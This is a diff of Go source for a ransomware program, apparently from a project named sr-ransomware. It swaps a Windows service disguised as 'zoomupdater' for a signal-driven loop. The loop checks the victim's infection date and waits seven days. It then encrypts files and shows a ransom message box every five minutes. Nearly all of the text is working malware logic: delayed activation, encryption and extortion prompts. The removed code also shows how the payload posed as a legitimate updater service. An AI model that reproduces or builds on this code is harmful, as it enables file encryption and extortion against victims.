@@ -5,32 +5,42 @@ import (
     "time"
     "sync"
     "runtime"
+    "os/signal"
     "path/filepath"
 
-    "golang.org/x/sys/windows/svc"
     "github.com/sug0/sr-ransomware/go/win"
     "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
 )
 
-type service struct {
-    ext  map[string]bool
-    exec string
-    date time.Time
-}
-
-const cryptoArg = "winmain"
-
+var date time.Time
 var allExtensions map[string]bool
 
-func main() {
-    if len(os.Args) > 1 && os.Args[1] == cryptoArg {
-        cryptoMain()
-        return
-    }
-    serviceMain()
+func init() {
+    runtime.LockOSThread()
 }
 
-func cryptoMain() {
+func main() {
+    var err error
+    date, err = victim.InfectionDate()
+    if err != nil {
+        // for some reason victim hasn't been infected,
+        // or the infection files have been tampered with;
+        // all in all, it's just best to exit
+        return
+    }
+    date = date.Add(7 * 24 * time.Hour)
+
+    sig := make(chan os.Signal, 1)
+    signal.Notify(sig, os.Kill, os.Interrupt)
+
+    if time.Now().Before(date) {
+        beforeDeployment(sig)
+        return
+    }
+    afterDeployment(sig)
+}
+
+func dialog() {
     // crypto dialog
     win.MessageBox(
         "Ooopsies!!!!!!!",
@@ -109,94 +119,42 @@ func cryptoMain() {
     }
 }
 
-func serviceMain() {
-    runtime.LockOSThread()
-    s := service{
-        exec: `"`+os.Args[0] + (`" ` + cryptoArg),
-    }
-    svc.Run("zoomupdater", &s)
-}
-
-func willExit(c svc.ChangeRequest, changes chan<- svc.Status) (exit bool) {
-    switch c.Cmd {
-    case svc.Stop, svc.Shutdown:
-        exit = true
-        changes <- svc.Status{State: svc.StopPending}
-    case svc.Interrogate:
-        changes <- c.CurrentStatus
-        time.Sleep(100 * time.Millisecond)
-        changes <- c.CurrentStatus
-    }
-    return
-}
-
-func (s *service) Execute(_ []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
-    changes <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}
-
-    var err error
-    s.date, err = victim.InfectionDate()
-    if err != nil {
-        // for some reason victim hasn't been infected,
-        // or the infection files have been tampered with;
-        // all in all, it's just best to exit
-        return
-    }
-    s.date = s.date.Add(7 * 24 * time.Hour)
-
-    if time.Now().Before(s.date) {
-        s.beforeDeployment(r, changes)
-        return
-    }
-    s.afterDeployment(r, changes)
-    return
-}
-
-func (s *service) beforeDeployment(r <-chan svc.ChangeRequest, changes chan<- svc.Status) {
+func beforeDeployment(sig <-chan os.Signal) {
     for {
         select {
-        case c := <-r:
-            if willExit(c, changes) {
-                return
-            }
+        case <-sig:
+            return
         case t := <-time.After(1 * time.Minute):
-            if t.After(s.date) {
-                s.afterDeployment(r, changes)
+            if t.After(date) {
+                afterDeployment(sig)
             }
         }
     }
 }
 
-func (s *service) afterDeployment(r <-chan svc.ChangeRequest, changes chan<- svc.Status) {
+func afterDeployment(sig <-chan os.Signal) {
     done := make(chan struct{})
     go encryptFiles(done)
     for {
         select {
-        case c := <-r:
-            if willExit(c, changes) {
-                return
-            }
+        case <-sig:
+            return
         case <-done:
-            s.afterEncryption(r, changes)
+            afterEncryption(sig)
         }
     }
 }
 
-func (s *service) afterEncryption(r <-chan svc.ChangeRequest, changes chan<- svc.Status) {
-    s.launchCrypto()
+func afterEncryption(sig <-chan os.Signal) {
+    go dialog()
     for {
         select {
-        case c := <-r:
-            if willExit(c, changes) {
-                return
-            }
+        case <-sig:
+            return
         case <-time.After(5 * time.Minute):
-            s.launchCrypto()
+            go dialog()
         }
     }
-}
-
-func (s *service) launchCrypto() {
-    win.LaunchProcess(s.exec)
 }
 
 func encryptFiles(done chan<- struct{}) {
